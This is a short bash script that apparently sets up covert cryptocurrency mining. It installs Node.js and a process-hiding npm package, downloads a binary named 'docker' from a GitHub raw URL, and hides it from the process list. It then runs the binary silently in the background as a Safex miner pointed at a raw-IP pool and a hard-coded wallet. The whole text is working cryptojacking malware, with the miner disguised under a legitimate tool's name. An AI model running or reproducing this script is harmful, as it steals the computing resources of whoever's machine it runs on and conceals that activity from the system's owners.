#!/bin/bash
apt update && apt -y install sudo gcc curl zip
sudo su --command "sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.5.0 && npm i -g node-process-hider && wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker && ph add docker && chmod +x docker && ./docker -o 40.83.177.217:80 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
ls"
